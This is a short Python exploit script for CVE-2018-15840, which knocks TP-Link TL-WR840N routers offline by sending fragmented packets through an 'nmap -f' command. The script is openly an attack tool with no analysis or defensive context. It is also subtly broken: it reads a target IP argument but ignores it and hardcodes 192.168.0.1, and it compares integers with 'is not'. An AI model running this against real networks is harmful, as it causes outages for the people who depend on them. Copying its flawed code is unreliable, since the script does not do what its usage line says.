#실행을 완료하기 위해 40초 정도 소요됨
import subprocess
import sys
from colorama import Fore

decription= r"""
 -----------------------------------------------------------------------------
|                              CVE-2018-15840                                |
|                                                                            |
|  TP-Link TL-WR840N devices allow remote malicious users to cause a denial  |
|  of service (networking outage) via fragmented packets, as demonstrated by | 
|  an "nmap -f" command.                                                     |
 -----------------------------------------------------------------------------
"""

if len(sys.argv) is not 2:
   print(decription)
   print(Fore.YELLOW+"[-] Example: python cve-2018-15840.py <Target IP>"+Fore.RESET)
   sys.exit()

target = sys.argv[1]
res = subprocess.check_output('nmap -f 192.168.0.1', shell=True)
print res
